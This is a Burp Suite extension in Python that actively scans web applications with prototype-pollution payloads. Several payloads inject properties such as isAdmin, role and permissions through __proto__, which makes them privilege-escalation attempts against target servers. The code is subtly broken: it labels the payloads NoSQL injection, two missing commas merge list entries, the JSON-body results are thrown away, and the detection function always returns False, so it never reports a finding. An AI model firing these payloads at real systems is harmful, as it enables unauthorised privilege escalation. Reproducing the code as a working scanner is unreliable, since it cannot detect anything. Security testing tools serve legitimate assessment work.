import json

from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        # Set our extension name
        callbacks.setExtensionName("Custom Active Scan Tasks")

        # Register a custom scanner
        self.scanner = CustomScanner(callbacks)
        callbacks.registerScannerCheck(self.scanner)

        print("Custom Active Scan Tasks extension loaded.")
class CustomScanner(IScannerCheck):
    def __init__(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

    def doPassiveScan(self, baseRequestResponse):
        # Implement passive scanning logic here
        # Return a list of IScanIssue objects or None
        return None

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # List of NoSQL injection payloads
        base_payloads = [
            'Object.__proto__["evilProperty"]="evilPayload"',
            'Object.__proto__.evilProperty="evilPayload"',
            'Object.constructor.prototype.evilProperty="evilPayload"',
            'Object.constructor["prototype"]["evilProperty"]="evilPayload"',
            '{"__proto__": {"evilProperty": "evilPayload"}}',
            '{"__proto__.name":"test"}',
            'x[__proto__][abaeead] = abaeead',
            'x.__proto__.edcbcab = edcbcab',
            '__proto__[eedffcb] = eedffcb',
            '__proto__.baaebfc = baaebfc',
            '?__proto__[test]=test'
            '"__proto__":{"evilProperty":"/tmp/test.txt',
            '},{"evilProperty":""},',
            '},{"evilProperty":"true"},',
            '},{"evilProperty":"1"},',
            '},{"evilProperty":"0"},',
            '{"evilProperty":""},',
            '{"evilProperty":"true"},',
            '{"evilProperty":"1"},',
            '{"evilProperty":"0"},'
            '{"evilProperty":""}',
            '{"evilProperty":"true"}',
            '{"evilProperty":"1"}',
            '{"evilProperty":"0"}'
        ]

        popular_variables = ['isadmin', 'user', 'admin', 'username', 'password', 'email', 'id', 'role', 'status']

        json_list = [
            {"aaa": "value1"},
            {"bbb": {"isAdmin": "true"}},
            {"__proto__.isAdmin": True},
            {"__proto__.permissions": ["read", "write"]},
            {"__proto__.nestedProperty": {"nestedKey": "nestedValue"}},
            {"__proto__.arrayProperty": [1, 2, 3]},
            # Additional payloads with __proto__ can be added here
        ]

        nosqli_payloads = []
        for var in popular_variables:
            for payload in base_payloads:
                nosqli_payloads.append(payload.replace("evilProperty", var))
        issues = []

        for payload in json_list:
            checkRequest = self.modifyJsonRequestBody(baseRequestResponse.getRequest(), payload, self._helpers)
            checkResponse = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest)

        for payload in nosqli_payloads:
            # Insert the payload into the insertion point
            checkRequest = insertionPoint.buildRequest(payload)

            checkRequest = self.addCustomHeader(checkRequest, "MyCustomHeader", "Test123")
            # Send the request with the payload
            checkResponse = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest)

            # Analyze the response to see if it's vulnerable
            if self.isVulnerable(checkResponse):
                issues.append(CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [self._callbacks.applyMarkers(checkResponse, None, None)],
                    "NoSQL Injection",
                    "The application appears to be vulnerable to NoSQL injection.",
                    "High",
                    "Certain",
                    checkResponse
                ))
                  # Stop after finding the first vulnerability

        return issues

    def addCustomHeader(self, request, headerName, headerValue):
        # Convert request to a string
        requestInfo = self._helpers.analyzeRequest(request)
        headers = list(requestInfo.getHeaders())
        # Add the custom header
        headers.append(headerName + ": " + headerValue)
        # Get the body
        bodyBytes = request[requestInfo.getBodyOffset():]
        # Build the new request with the custom header
        newRequest = self._helpers.buildHttpMessage(headers, bodyBytes)
        return newRequest

    def modifyJsonRequestBody(self, request, new_data, helpers):
        requestInfo = helpers.analyzeRequest(request)
        bodyBytes = request[requestInfo.getBodyOffset():]
        bodyStr = helpers.bytesToString(bodyBytes)

        try:
            jsonData = json.loads(bodyStr)

            # Add __proto__ object with abc: abc
            jsonData['__proto__'] = {'abc': 'abc'}

            # Additionally, merge new_data if required
            jsonData.update(new_data)

            modifiedBodyStr = json.dumps(jsonData)
            modifiedBodyBytes = helpers.stringToBytes(modifiedBodyStr)
            return helpers.buildHttpMessage(requestInfo.getHeaders(), modifiedBodyBytes)
        except ValueError:  # Fallback for environments where JSONDecodeError is not available
            return request




    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        # Determine if two issues are duplicates
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1
        else:
            return 0


    def isVulnerable(self, response):
        # Convert byte response to a string
        response_str = self._helpers.bytesToString(response.getResponse())

        # Define keywords or error messages that indicate NoSQLi
        nosqli_indicators = [
        ]

        # Check if any of the indicators are in the response
        #for indicator in nosqli_indicators:
            #if indicator in response_str:
                #return True

        # Implement other checks as necessary (e.g., unusual response length)

        return False


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity, confidence, response):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity
        self._confidence = confidence
        self._response = response

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0  # Custom issue type; change as needed

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return self._confidence

    def getIssueBackground(self):
        return None  # Provide a description of the issue

    def getRemediationBackground(self):
        return None  # Provide remediation details

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return None  # Provide specific remediation steps

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService